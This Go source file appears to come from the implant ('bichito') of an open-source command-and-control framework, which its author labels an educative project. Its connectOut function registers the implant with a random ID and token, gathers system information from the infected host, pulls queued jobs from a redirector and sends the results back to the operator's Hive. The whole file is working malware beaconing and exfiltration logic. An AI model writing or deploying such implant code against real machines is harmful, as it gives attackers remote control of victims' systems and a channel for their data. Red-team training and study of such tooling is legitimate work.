//{{{{{{{ Bichito High-Level Communications with Redirector }}}}}}}

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"strings"
	"encoding/json"
	"bichito/modules/network"
	"bichito/modules/biterpreter"
	"fmt"
	"bytes"
)


// A. Check if BID is correct, if not send checking Job
// B. Retrieve Jobs from target redirector, if connection error return failure
// C. Send Processed Jobs to target redirector,if connection error return failure

func connectOut() string{
	
	var newJobs []*Job
	var encodedJobs []byte
	var error string
		
	//If Bid is not correct yet, send checking package again
	if !strings.Contains(bid,"B-"){

		bid = fmt.Sprintf("%s%s","B-",randomString(8))
		jobChecking := &Job{"","","",bid,"BiChecking","","","",""}
	
		var jobsChecking = []*Job{jobChecking}
        bufRC := new(bytes.Buffer)
        json.NewEncoder(bufRC).Encode(jobsChecking)
		resultRP := bufRC.String()

	
		//Prepare Authentication with Bid for next Connections
		biauth := BiAuth{bid,biconfig.Token}
		bufRP := new(bytes.Buffer)
		json.NewEncoder(bufRP).Encode(biauth)
		resultRP = bufRP.String()
		authbearer = resultRP
		authbearer = strings.TrimSuffix(authbearer, "\n")

		//Checking(redirector,authentication,bid,[]byte(resultRP))
		return "Success"
	}

	//fmt.Println("Bid Outside network:"+bid)
	
	if sysinfo != true {
		
		errorS,info := biterpreter.Sysinfo()
		if errorS{
			info = "Error Getting System Info:"+info
			return info
		}

		jobsysinfo := &Job{"","","",bid,"sysinfo","","Success",info,""}


		jobsToHive.mux.Lock()
		jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
		jobsToHive.mux.Unlock()

		sysinfo = true
	}

	//Get Any Jobs from Bots targeting this redirector
	encodedJobs,error = network.RetrieveJobs(redirectors[0],authbearer)
	if error != "Success"{
		return error
	}

	errD := json.Unmarshal(encodedJobs,&newJobs)
	//decoder := json.NewDecoder(encodedJobs)
    //errD = decoder.Decode(&newJobs)
	if errD != nil{
		return "Error Decoding Jobs from Hive"+errD.Error()
	}

	//Lock shared Slice
	jobsToProcess.mux.Lock()
	defer jobsToProcess.mux.Unlock()

	jobsToProcess.Jobs = append(jobsToProcess.Jobs,newJobs...)
	
	jobsToHive.mux.Lock()
	defer jobsToHive.mux.Unlock()


		//Encode Jobs
		bufRC := new(bytes.Buffer)
		json.NewEncoder(bufRC).Encode(jobsToHive.Jobs)
		jobsToHi := bufRC.String()
		error = network.SendJobs(redirectors[0],authbearer,[]byte(jobsToHi))
		if error != "Success"{
			return error
		}

	jobsToHive.Jobs = jobsToHive.Jobs[:0]


	return "Success"
}